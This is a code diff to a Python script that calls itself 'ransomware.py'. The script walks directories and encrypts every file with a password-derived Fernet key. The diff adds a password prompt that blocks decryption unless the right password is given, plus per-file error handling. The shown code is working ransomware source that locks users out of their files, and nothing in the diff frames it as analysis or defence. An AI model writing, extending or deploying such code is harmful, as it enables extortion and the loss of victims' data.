@@ -1,6 +1,6 @@
 import ctypes
 import sys
-from tkinter import messagebox, Tk, Button
+from tkinter import messagebox, simpledialog, Tk, Button
 from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
 from cryptography.fernet import Fernet
 import base64
@@ -26,12 +26,16 @@ def derive_key(password):
 
 key = derive_key(password)
 
+def validate_password(input_password):
+    """Check if the provided password is correct."""
+    return derive_key(input_password) == key
+
 def encrypt_directory(directory, key):
     try:
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
-                # Skip desktop.ini and ransomware.py
+                # Skip excluded files
                 if file.lower() in ["desktop.ini", "ransomware.py"]:
                     continue
                 filepath = os.path.join(root, file)
@@ -48,6 +52,15 @@ def encrypt_directory(directory, key):
 
 def decrypt_directory(directory, key):
     try:
+        # Ask for password before decryption
+        entered_password = simpledialog.askstring(
+            "Password Required", "Enter the decryption password:", show="*"
+        )
+        
+        if not entered_password or not validate_password(entered_password):
+            messagebox.showerror("Error", "Incorrect password. Decryption aborted.")
+            return
+        
         f = Fernet(key)
         for root, _, files in os.walk(directory):
             for file in files:
@@ -55,14 +68,19 @@ def decrypt_directory(directory, key):
                 if not file.endswith(".enc"):
                     continue
                 filepath = os.path.join(root, file)
-                with open(filepath, "rb") as file_obj:
-                    encrypted_data = file_obj.read()
-                decrypted_data = f.decrypt(encrypted_data)
-                decrypted_filepath = filepath[:-4]  # Remove the .enc extension
-                with open(decrypted_filepath, "wb") as file_obj:
-                    file_obj.write(decrypted_data)
-                os.remove(filepath)  # Delete the encrypted file
-        messagebox.showinfo("Success", "All files decrypted successfully!")
+                try:
+                    with open(filepath, "rb") as file_obj:
+                        encrypted_data = file_obj.read()
+                    decrypted_data = f.decrypt(encrypted_data)
+                    decrypted_filepath = filepath[:-4]  # Remove the .enc extension
+                    with open(decrypted_filepath, "wb") as file_obj:
+                        file_obj.write(decrypted_data)
+                    os.remove(filepath)  # Delete the encrypted file
+                except Exception as e:
+                    messagebox.showerror(
+                        "Error", f"Failed to decrypt {filepath}. Error: {e}"
+                    )
+        messagebox.showinfo("Success", "Decryption completed successfully!")
     except Exception as e:
         messagebox.showerror("Error", f"Decryption failed: {e}")
 
